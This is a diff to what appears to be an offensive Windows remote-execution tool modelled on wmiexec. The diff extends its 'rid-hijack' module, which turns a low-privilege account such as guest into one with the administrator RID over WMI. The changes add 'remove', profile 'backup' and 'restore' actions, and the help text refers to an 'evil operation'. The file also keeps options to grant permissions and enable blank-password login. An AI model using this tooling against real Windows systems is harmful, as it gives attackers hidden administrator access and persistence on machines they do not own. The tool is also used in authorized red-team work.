@@ -162,12 +162,12 @@ class WMIEXEC:
             
             if self.__options.module == "rid-hijack":
                 RID_Hijack = RID_Hijack_Toolkit(iWbemLevel1Login, dcom)
-                if all([self.__options.query]):
-                    RID_Hijack.query_user(self.__options.query)
+                if self.__options.query == True:
+                    RID_Hijack.query_user()
                 elif self.__options.action:
                     if self.__options.action == "hijack" and all([self.__options.hijack_target and self.__options.hijack_rid]):
                         RID_Hijack.hijack(self.__options.action, self.__options.hijack_target, self.__options.hijack_rid)
-                    elif self.__options.action in ['activate', 'deactivate'] and all([self.__options.hijack_target]):
+                    elif self.__options.action in ['activate', 'deactivate', 'remove'] and all([self.__options.hijack_target]):
                         RID_Hijack.hijack(self.__options.action, self.__options.hijack_target)
                     elif self.__options.action in ['grant', 'grant-old', 'retrieve', 'retrieve-old'] and all([self.__options.hijack_target]):
                         RID_Hijack.Permissions_Controller(self.__options.action, self.__options.hijack_target)
@@ -176,6 +176,10 @@ class WMIEXEC:
                         RID_Hijack.BlankPasswordLogin('enable')
                     else:
                         RID_Hijack.BlankPasswordLogin('disable')
+                elif self.__options.backup:
+                    RID_Hijack.backup_UserProfile(rid=self.__options.backup, hostname=addr)
+                elif self.__options.restore:
+                    RID_Hijack.restore_UserProfile(self.__options.restore)
                 else:
                     print("[-] Wrong operation")
 
@@ -294,11 +298,13 @@ if __name__ == '__main__':
 
     # rid_hijack.py
     rid_HijackParser = subparsers.add_parser('rid-hijack', help='RID Hijack.')
-    rid_HijackParser.add_argument('-query', action='store', help="Query user via username.")
+    rid_HijackParser.add_argument('-query', action='store_true', help="Query all users.")
     rid_HijackParser.add_argument('-hijack-target', action='store', help='Specify users RID you want to hijack from.(Like guest user 501)')
     rid_HijackParser.add_argument('-hijack-rid', action='store', help="Specify RID you want to hijack to.(Like administrator rid 500)")
-    rid_HijackParser.add_argument('-action', action='store', choices=['hijack', 'activate', 'deactivate', 'grant', 'grant-old', 'retrieve', 'retrieve-old'], help='Action you want to do.')
+    rid_HijackParser.add_argument('-action', action='store', choices=['hijack', 'activate', 'deactivate', 'grant', 'grant-old', 'retrieve', 'retrieve-old', 'remove'], help='Action you want to do.')
     rid_HijackParser.add_argument('-blank-pass-login', action='store', choices=['enable', 'disable'], help='Enable or disable blank pass login.(for guest user)')
+    rid_HijackParser.add_argument('-backup', action='store', help='Backup user profile before U want to do evil operation, this will generate a json file which use for backup)')
+    rid_HijackParser.add_argument('-restore', action='store', help='Restore user profile after U want to do evil operation, need to specify the backup json file)')
 
     if len(sys.argv) == 1:
         parser.print_help()
